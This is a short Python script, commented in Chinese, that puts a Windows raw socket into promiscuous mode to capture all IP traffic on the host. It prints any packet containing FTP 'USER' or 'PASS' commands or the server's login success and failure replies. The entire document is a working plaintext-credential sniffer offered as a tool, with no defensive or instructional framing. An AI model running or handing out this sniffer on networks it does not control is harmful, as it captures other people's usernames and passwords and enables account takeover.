import socket, string


"""包嗅探"""
host = socket.gethostbyname(socket.gethostname()) #  获取主机ip
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP) #  AF_INET协议IPv4，OCK_RAW原始套接字，IPPROTO_IP嗅探IP协议段
s.bind((host, 0))
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) #  向内核提供包和IP头
s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) #  接收所有包
while True:
	data = s.recvfrom(65565)
	printable = set(string.printable)
	parsedata = "".join(x if x in printable else "." for x in data[0]) #  转化为可输出形式
	if(parsedata.find("USER") > 0):
		print(parsedata)
	elif(parsedata.find("PASS") > 0):
		print(parsedata)
	elif(parsedata.find("530 User cannot log in") > 0):
		print(parsedata)
	elif(parsedata.find("230 User logged in") > 0):
		print(parsedata)